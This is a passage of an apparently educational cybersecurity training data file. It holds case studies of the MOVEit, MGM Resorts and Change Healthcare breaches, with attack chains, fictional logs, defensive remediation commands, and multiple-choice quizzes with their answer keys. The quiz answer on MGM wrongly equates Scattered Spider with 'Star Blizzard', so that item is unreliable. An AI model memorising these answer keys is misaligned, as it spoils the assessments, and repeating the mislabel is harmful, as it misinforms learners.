          options: ['A custom web shell disguised as human2_aspx.ashx', 'A virus named calc.exe', 'A text file called readme.txt', 'A corrupt driver file'],
          correctIndex: 0,
          explanation: 'The attackers dropped LEMURLOOT, an ASP.NET web shell named human2_aspx.ashx to extract file metadata.'
        }
      ],
      remediationTask: 'Remove unauthorized .ashx files and patch the SQL parameterization handler.',
      verificationCommand: 'rm -f /var/www/html/human2_aspx.ashx'
    },
    quiz: {
      question: 'How did the MOVEit attack campaign differ from traditional ransomware attacks?',
      options: ['The attackers did not encrypt any target systems; they purely exfiltrated sensitive files and demanded ransom not to publish them', 'They deleted the operating system', 'They only stole cryptocurrencies', 'They sent physical letters in the mail'],
      correctIndex: 0,
      explanation: 'Cl0p shifted to pure data theft extortion without deploying encryptors, speeding up their operation across 2,700 targets.'
    },
    aiDebrief: {
      discoveryPrompt: 'What web parameter was exploited to achieve pre-authenticated SQL injection?',
      rootCausePrompt: 'Why are file transfer appliances particularly rewarding targets for cybercriminals?',
      evidencePrompt: 'What file creation event indicated the installation of the LEMURLOOT web shell?',
      defensePrompt: 'How can IP allowlisting and network isolation protect edge appliances from zero-days?',
      takeawayPrompt: 'Why is data minimization crucial for organizations managing file transfer portals?'
    }
  },
  {
    id: 'inc-14',
    name: 'MGM Resorts Cyber Attack',
    year: 2023,
    sector: 'Hospitality, Entertainment & Gaming',
    incidentType: 'Social Engineering',
    difficulty: 'Intermediate',
    whatHappened: 'Scattered Spider threat actors used voice phishing (vishing) against the MGM IT helpdesk to reset MFA on a super-administrator account, crippling hotel and casino operations for days.',
    initialAttackVector: 'Voice phishing (vishing) call to IT helpdesk impersonating an employee using information harvested from LinkedIn.',
    attackChain: [
      '1. Reconnaissance on LinkedIn to find employee names, titles, and job roles',
      '2. 10-minute phone call to internal IT help desk posing as the employee',
      '3. IT help desk resets Multi-Factor Authentication (MFA) credentials for the caller',
      '4. Okta identity provider takeover and elevation to Azure AD Global Administrator',
      '5. Deployment of BlackCat / ALPHV ransomware across ESXi hypervisors'
    ],
    securityWeakness: 'Inadequate identity verification procedures at the IT help desk allowing social engineering MFA resets.',
    whatAttackersAchieved: 'Shut down slot machines, digital room keys, reservation systems, and ATM machines across Las Vegas; caused over $100M in damages.',
    impact: 'Highlighted that human-centric social engineering can effortlessly bypass the most advanced technical MFA and EDR software.',
    howItWasDetected: 'Casino guests and staff reported that slot machines and electronic room keys across Bellagio and MGM Grand stopped working.',
    whatDefendersCouldHaveDone: 'Enforced out-of-band manager verification or biometric in-person proofing before resetting administrative MFA credentials.',
    mitigations: ['Implement strict identity verification protocols for IT service desk MFA resets', 'Require manager authorization or FIDO2 hardware token re-issuance', 'Segment identity federation environments'],
    lessonsForEthicalHackers: 'Social engineering the human helpdesk is often orders of magnitude easier than finding a zero-day exploit.',
    lessonsForBlueTeam: 'The IT helpdesk is the front line of enterprise security; verification workflows must be rigorous and non-circumventable.',
    mitreMapping: [
      { tactic: 'Initial Access', techniqueId: 'T1566.004', techniqueName: 'Phishing: Voice Phishing (Vishing)' },
      { tactic: 'Credential Access', techniqueId: 'T1556', techniqueName: 'Modify Authentication Process' }
    ],
    relatedSkills: ['Social Engineering Defense', 'Helpdesk Security', 'Okta & Identity Security', 'ESXi Hardening'],
    timeline: [
      { stage: 'Reconnaissance', title: 'LinkedIn Scraping', detail: 'Attackers identify MGM employee name and job credentials on LinkedIn.', timestamp: 'Day 1 09:00' },
      { stage: 'Vishing Call', title: 'Helpdesk MFA Reset', detail: 'Caller convinces helpdesk technician to register a new MFA phone number.', timestamp: 'Day 1 10:15' },
      { stage: 'Okta Pivot', title: 'Global Admin Acquired', detail: 'Attackers log into Okta dashboard and grant themselves Azure Global Admin.', timestamp: 'Day 1 11:30' },
      { stage: 'Hypervisor Lock', title: 'ESXi Servers Encrypted', detail: 'BlackCat ransomware deployed across VMware virtual machine clusters.', timestamp: 'Day 2 04:00' }
    ],
    safeSimulation: {
      labTitle: 'Helpdesk Social Engineering & MFA Verification Audit',
      scenario: 'Analyze a simulated helpdesk service ticket log for social engineering red flags and enforce manager approval workflows.',
      targetHost: '10.10.10.135 (sim-idp-gateway)',
      fictionalLogs: `[2026-08-21 10:14:02] HELPDESK-TICKET: Incoming call - Caller claimed: 'Alex Mercer (Lead SysAdmin)'\n[2026-08-21 10:14:45] TICKET-NOTE: User claimed phone lost in taxi. Requested instant MFA reset to new number (702-555-0199)\n[2026-08-21 10:15:10] OKTA-ADMIN: MFA factor reset for user alex.mercer@mgm.internal - Status: APPROVED BY AGENT (0 Verification Questions Asked)\n[2026-08-21 10:15:40] OKTA-SESSION: New login from unrecognized ASN: 198.51.100.200 (Tor exit node)`,
      investigationQuestions: [
        {
          question: 'What operational procedure failure allowed the attacker to take over the administrator\'s account?',
          options: ['The helpdesk technician reset the MFA factor over the phone without requiring formal identity verification or manager approval', 'The administrator had a 4-digit PIN', 'The firewall crashed', 'The server was running an unpatched version of Linux'],
          correctIndex: 0,
          explanation: 'The IT helpdesk failed to perform identity verification, blindly trusting the caller and registering a new MFA device.'
        }
      ],
      remediationTask: 'Enforce strict out-of-band manager approval rule for all administrative MFA resets.',
      verificationCommand: 'echo "mfa_reset_policy: require_manager_video_verification" >> /etc/helpdesk/policies.yaml'
    },
    quiz: {
      question: 'What threat group was primarily responsible for the voice phishing attack against MGM Resorts?',
      options: ['Scattered Spider (UNC3944 / Star Blizzard)', 'Anonymous', 'Equation Group', 'LulzSec'],
      correctIndex: 0,
      explanation: 'Scattered Spider is known for sophisticated English-fluent voice phishing targeting IT service desks and Okta environments.'
    },
    aiDebrief: {
      discoveryPrompt: 'How did the attackers gather enough background context to convincingly pose as an employee?',
      rootCausePrompt: 'Why is the IT helpdesk a prime target for social engineering campaigns?',
      evidencePrompt: 'What anomaly in the login session immediately followed the helpdesk MFA reset?',
      defensePrompt: 'How do phishing-resistant FIDO2 hardware keys prevent phone-based MFA reset bypasses?',
      takeawayPrompt: 'Why must human security policies be treated with the same engineering rigor as code?'
    }
  },
  {
    id: 'inc-15',
    name: 'Change Healthcare Cyber Incident',
    year: 2024,
    sector: 'Healthcare, Pharmacy & Insurance Payments',
    incidentType: 'Ransomware',
    difficulty: 'Master',
    whatHappened: 'ALPHV / BlackCat ransomware compromised Change Healthcare through an un-MFA protected Citrix portal, paralyzing prescription billing and healthcare payments nationwide.',
    initialAttackVector: 'Stolen credentials used to access a Citrix remote access portal that lacked Multi-Factor Authentication.',
    attackChain: [
      '1. Purchase or credential-stuffing of valid corporate Citrix credentials',
      '2. Direct authentication to remote portal without an MFA challenge',
      '3. Undetected lateral movement across enterprise healthcare billing infrastructure for 9 days',
      '4. Exfiltration of 6 terabytes of sensitive patient medical and payment records',
      '5. Deployment of ALPHV ransomware encrypting critical transaction processing engines'
    ],
    securityWeakness: 'A single critical remote access server left without MFA enforcement, combined with inadequate backup isolation.',
    whatAttackersAchieved: 'Halted electronic pharmacy prescriptions and billions of dollars in medical insurance claims nationwide; extorted a $22 million ransom payment.',
    impact: 'The most disruptive cyber attack against the US healthcare system in history, threatening the solvency of thousands of medical practices.',
    howItWasDetected: 'Change Healthcare noticed anomalous system activity and initiated emergency network disconnects to contain the spread.',
    whatDefendersCouldHaveDone: 'Ensured that every single external ingress portal had mandatory MFA with zero exceptions.',
    mitigations: ['Enforce universal MFA across all remote access, VPN, and Citrix portals with no legacy exceptions', 'Maintain isolated, immutable transaction backups', 'Implement behavioral anomaly detection on bulk data exports'],
    lessonsForEthicalHackers: 'A massive corporate security architecture can fail completely if a single legacy login portal is exempted from MFA.',
    lessonsForBlueTeam: 'Regular external attack surface management (EASM) scans are vital to find forgotten portals before adversaries do.',
    mitreMapping: [
      { tactic: 'Initial Access', techniqueId: 'T1078.002', techniqueName: 'Valid Accounts: Domain Accounts' },
      { tactic: 'Impact', techniqueId: 'T1486', techniqueName: 'Data Encrypted for Impact' },
      { tactic: 'Exfiltration', techniqueId: 'T1567', techniqueName: 'Exfiltration Over Web Service' }
    ],
    relatedSkills: ['Healthcare Security', 'Citrix/VDI Hardening', 'External Attack Surface Management', 'Zero Trust IAM'],
    timeline: [
      { stage: 'Initial Entry', title: 'Citrix Login Without MFA', detail: 'Attackers log into corporate portal using stolen credentials.', timestamp: 'Feb 12' },
      { stage: 'Dwell Time & Exfil', title: '6TB Medical Records Stolen', detail: 'Attackers map billing databases and exfiltrate records undetected for 9 days.', timestamp: 'Feb 13-20' },
      { stage: 'Ransomware Triggered', title: 'Billing Engine Encrypted', detail: 'ALPHV deploys encryptor locking claims processing servers.', timestamp: 'Feb 21' },
      { stage: 'National Fallout', title: 'Pharmacies Stalled', detail: 'Thousands of pharmacies unable to verify insurance for patient prescriptions.', timestamp: 'Feb 22+' }
    ],
    safeSimulation: {
      labTitle: 'Remote Access Surface Audit & Universal MFA Verification',
      scenario: 'Scan simulated external facing endpoints to discover any un-MFA protected Citrix/VPN portals.',
      targetHost: '10.10.10.145 (sim-citrix-gateway)',
      fictionalLogs: `[EASM-SCAN] Discovered public host: citrix-legacy.change.internal:443\n[AUTH-TEST] Submitting valid test credentials to /Citrix/AuthWeb/Login\n[AUTH-RESULT] Authentication SUCCESSFUL - HTTP 200 OK (MFA Prompt: NOT CONFIGURED)\n[ALERT] High-severity finding: Remote ingress portal lacks Multi-Factor Authentication`,
      investigationQuestions: [
        {
          question: 'What single point of failure allowed the ALPHV threat actors to breach Change Healthcare\'s network?',
          options: ['A legacy Citrix remote access server that did not have Multi-Factor Authentication (MFA) enabled', 'A drone flying near the data center', 'An SQL injection on the marketing blog', 'A corrupted hard drive'],
          correctIndex: 0,
          explanation: 'UnitedHealth Group leadership confirmed that attackers used stolen credentials on a Citrix server lacking MFA.'
        }
      ],
      remediationTask: 'Decommission or enforce mandatory hardware-backed MFA on all external gateway interfaces.',
      verificationCommand: 'citrix-adm-tool --enforce-mfa-all-portals'
    },
    quiz: {
      question: 'What lesson does the Change Healthcare breach reinforce regarding enterprise Multi-Factor Authentication?',
      options: ['MFA must be enforced universally across 100% of external access points with zero legacy exceptions', 'MFA is only needed for the CEO', 'MFA can be disabled on weekends', 'Passwords are more secure than MFA'],
      correctIndex: 0,
      explanation: 'Any single entry point left without MFA can undermine the security of an entire multi-billion-dollar enterprise.'
    },
    aiDebrief: {
      discoveryPrompt: 'What external asset scanning technique would have identified the un-MFA protected portal before attackers did?',
      rootCausePrompt: 'Why do organizations sometimes leave legacy remote access portals without MFA?',
      evidencePrompt: 'What dwell time and data exfiltration volume occurred before the encryptor was executed?',
      defensePrompt: 'How does Continuous Threat Exposure Management (CTEM) prevent forgotten assets from remaining vulnerable?',
      takeawayPrompt: 'Why is cyber resilience in healthcare directly tied to human patient safety?'
    }
  }
];

